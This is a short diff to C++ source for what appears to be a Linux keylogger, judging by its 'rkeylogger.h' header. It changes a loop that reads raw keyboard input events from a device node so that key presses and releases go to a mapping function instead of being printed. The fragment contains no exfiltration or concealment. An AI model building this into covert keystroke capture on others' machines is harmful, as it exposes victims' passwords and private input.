@@ -2,6 +2,7 @@
 #include <unistd.h>
 #include <linux/input.h>
 #include <iostream>
+#include <vector>
 
 #include "rkeylogger.h"
 
@@ -16,13 +17,11 @@ void read_devnode(const char *devnode) {
     
     while (true) {
         ssize_t bytesRead = read(fd, &ev, sizeof(struct input_event));
-        if (bytesRead == sizeof(struct input_event)) {
-            if(ev.code == 1){
-                break;
-            }
-            
-            if (ev.type == EV_KEY && (ev.value == 0 || ev.value == 1)) {
-                std::cout << "code: " << ev.code << std::endl;
+        if (bytesRead == sizeof(struct input_event) && (ev.value == 0 || ev.value == 1)) {
+            if (ev.type == EV_KEY) {
+                if(map_code(ev.code, ev.value) == -1){
+                    break;
+                }
             }
         }
     }
